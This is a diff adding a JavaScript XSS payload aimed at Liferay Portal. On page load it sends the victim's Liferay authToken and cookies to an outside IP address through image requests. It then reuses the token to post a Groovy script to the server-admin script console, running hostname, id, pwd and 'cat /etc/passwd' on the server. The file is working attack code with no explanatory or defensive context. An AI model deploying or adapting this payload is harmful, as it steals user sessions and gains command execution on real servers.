@@ -1,0 +1,48 @@
+//confirm(1337);
+//var pAuth = Liferay.authToken;
+//alert(pAuth);
+//alert(Liferay.authToken);
+
+window.onload = function testFunction()
+{
+	// just debug
+	console.log('The Script will load now.');
+
+	// LiferayauthToken stealing
+	var pAuth = Liferay.authToken;
+	console.log(pAuth);
+	var i=new Image;
+	i.src='https://192.168.17.158/p_auth?value=' +pAuth;
+
+	// cookie stealing (sometimes it gives user cookie)
+	console.log(document.cookie);
+	var j=new Image;
+	j.src='https://192.168.17.158/cookie?value=' +document.cookie;
+
+	// exec Groovy script
+	var xhr = new XMLHttpRequest();
+	var method = "POST";
+	var groovy_url = "/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_javax.portlet.action=%2Fserver_admin%2Fedit_server";
+//	var cmd = "def+cmd+%3D+%22hostname%22.execute%28%29%3B%0D%0Aprintln%28%22%24%7Bcmd.text%7D%22%29%3B";
+//	var cmd = "def+cmd+%3D+%22cat%20/etc/passwd%22.execute%28%29%3B%0D%0Aprintln%28%22%24%7Bcmd.text%7D%22%29%3B";
+	var cmd = "def+cmd1+%3D+%22hostname%22.execute%28%29%3B%0D%0Aprintln%28%22%24%7Bcmd1.text%7D%22%29%3B%0D%0Adef+cmd2+%3D+%22id%22.execute%28%29%3B%0D%0Aprintln%28%22%24%7Bcmd2.text%7D%22%29%3B%0D%0Adef+cmd3+%3D+%22pwd%22.execute%28%29%3B%0D%0Aprintln%28%22%24%7Bcmd3.text%7D%22%29%3B%0D%0Adef+cmd4+%3D+%22cat+%2Fetc%2Fpasswd%22.execute%28%29%3B%0D%0Aprintln%28%22%24%7Bcmd4.text%7D%22%29%3B";
+
+	//cmd
+	//def cmd = "hostname".execute();
+	//println("${cmd.text}");
+
+	xhr.open(method, groovy_url, true);
+	xhr.withCredentials = true;
+
+	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+	xhr.send("_com_liferay_server_admin_web_portlet_ServerAdminPortlet_formDate="
+	+ "&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script"
+	+ "&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_redirect="
+	+ "&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_language=groovy"
+	+ "&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_script=" + cmd
+	+ "&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_cmd=runScript"
+	+ "&p_auth=" + pAuth);
+
+	console.log('Groovy command is executed');
+}
